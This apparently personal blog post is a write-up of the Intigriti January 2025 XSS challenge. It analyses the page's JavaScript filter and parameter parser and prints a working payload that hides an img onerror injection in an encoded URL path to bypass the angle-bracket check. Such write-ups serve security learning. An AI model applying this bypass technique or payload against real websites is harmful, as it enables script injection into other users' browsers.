---
title: "Intigriti January 2025 - XSS Challenge"
date: 2025-01-10
draft: false
tags:
  - XSS
  - Writeup
  - Web Security
---
## Introduction

This month's Intigriti challenge presented us with a classic XSS objective - popping an alert box! Let's dive into how I approached and analyzed this challenge.

Challenge Link: https://challenge-0125.intigriti.io/

## Initial Reconnaissance

{{< video autoplay="true" loop="true" src="https://abhinavkuamr.github.io/securityBlogs/recon.mp4" >}}

The website presented a clean, minimalist interface with a simple functionality: users input their name into a text field, and the site displays a "Welcome [name]" message. Two key observations from initial testing:

1. Our input was being reflected back to us in the response
2. The URL contained a query parameter `?text=` with our input

## Source Code Analysis

### The Form Structure

The first piece of interesting code was the form implementation:

```html
<form id="textForm" onsubmit="redirectToText(event)">
    <h1>Enter your name!</h1>
    <label for="inputBox"></label>
    <input type="text" id="inputBox" name="inputBox" placeholder="Type here...">
    <button type="submit">Submit</button>
</form>
```

### Form Submission Handler

The form submission was handled by the `redirectToText` function:

```javascript
function redirectToText(event) {
    event.preventDefault();
    const inputBox = document.getElementById('inputBox');
    const text = encodeURIComponent(inputBox.value);
    window.location.href = `/challenge?text=${text}`;
}
```

This function:
1. Prevents the default form submission
2. Retrieves the input value
3. URL encodes the input
4. Redirects to `/challenge`(basically, the same page, so it's better to say just reloads the page) with the encoded input as a query parameter

### Page Load Handler

On page load, two functions were called:

```javascript
window.onload = function () {
    generateFallingParticles();
    checkQueryParam();
};
```

The `checkQueryParam` function caught my attention as it handled our input:

```javascript
function checkQueryParam() {
    const text = getParameterByName('text');
    if (text && XSS() === false) {
        const modal = document.getElementById('modal');
        const modalText = document.getElementById('modalText');
        modalText.innerHTML = `Welcome, ${text}!`;
        textForm.remove()
        modal.style.display = 'flex';
    }
}
```

### Identifying the XSS Sink

The potential XSS sink was clearly visible:
```javascript
modalText.innerHTML = `Welcome, ${text}!`;
```

This indicated my payload would be placed in an HTML context, suggesting we'd need angle brackets for exploitation. However, several security controls were in place:

1. The conditional statement `if (text && XSS() === false)`
2. The `getParameterByName()` function's parsing logic

### The XSS Protection Function

The `XSS()` function implemented basic protection:

```javascript
function XSS() {
    return decodeURIComponent(window.location.search).includes('<') || 
           decodeURIComponent(window.location.search).includes('>') || 
           decodeURIComponent(window.location.hash).includes('<') || 
           decodeURIComponent(window.location.hash).includes('>')
}
```

This function:
- Decodes and checks the query string for `<` or `>`
- Decodes and checks the hash value for `<` or `>`

### Parameter Parsing Analysis

The `getParameterByName` function contained crucial logic:

```javascript
function getParameterByName(name) {
    var url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)");
    results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return '';
    return decodeURIComponent(results[2].replace(/\+/g, " "));
}
```

Key aspects of this function:
1. Takes the full URL via `window.location.href`
2. Uses regex to extract the parameter value
3. The regex pattern `[?&]` + name + `(=([^&#]*)|&|#|$)`:
   - Matches parameters starting with `?` or `&`
   - Looks for exact parameter name match
   - Captures everything after `=` until it hits `&`, `#`, or end of string
4. Decodes the captured value and replaces `+` with spaces

This parsing logic is particularly interesting because it shows how the application processes our input before it reaches the vulnerable `innerHTML` sink.



# XSS 

## Exploitation

After analyzing the application's code, a key insight emerged: while the `XSS()` function checks for angle brackets in both query string and URL hash, the parameter extraction logic using regex examines the entire URL. This disparity creates an interesting attack vector.

### Initial Theory

The vulnerability stems from two key observations:
1. The `XSS()` function only inspects `window.location.search` and `window.location.hash`
2. The `getParameterByName()` function searches for parameters in the entire URL

This led to an interesting question: Could we inject our payload somewhere in the URL that wouldn't be caught by the `XSS()` function's checks?

### Path Traversal Attempt

My first approach leveraged path traversal concepts. The theory was that these two URLs should resolve to the same endpoint:
- Normal: `domain.com/challenge?text=something`
- With traversal: `domain.com/challenge/<payload>/../?text=something`

Initial payload attempt:
```
https://challenge-0125.intigriti.io/challenge/&text=<svg+onload=alert(1)/../?text=testing
```

However, this didn't work because browsers perform URL normalization, which resolved the path to:
```
https://challenge-0125.intigriti.io/challenge?text=testing
```

### Final Payload

To prevent URL normalization from breaking our payload, we needed to URL encode the critical components. The final working payload:

```
https://challenge-0125.intigriti.io/challenge%2F&text=happy%3Cimg+src=x+onerror=%22alert(1)%22+%3E%2F..%2F?text=something
```

### Payload Breakdown

Let's analyze how this payload bypasses the protections:

1. **Parameter Extraction**: The regex in `getParameterByName` finds our payload in the path:
   - Matches: `&text=happy<img src=x onerror="alert(1)" >/../`
   - This gets URL decoded and passed to the innerHTML sink

2. **XSS Protection Bypass**: The `XSS()` function only checks:
   - Query string: `?text=something` (clean)
   - Hash: (none present)
   - Neither location contains angle brackets, so check returns `false`

3. **Execution Flow**:
   - `text` parameter is found and extracted
   - `XSS()` returns `false`
   - The if-condition `if (text && XSS() === false)` evaluates to `true`
   - Our payload gets inserted into innerHTML
   - The img tag fails to load, triggering our alert

Here's the successful exploitation:

![XSS alert pop up](https://abhinavkuamr.github.io/securityBlogs/xss1st.png)

### Key Takeaways

This challenge highlights several important web security concepts:
1. The importance of considering the entire URL as an attack surface
2. How inconsistencies between security checks and parameter parsing can create vulnerabilities
3. The role of URL encoding in bypassing security controls
4. URL normalization and File Traversal are an important topic!

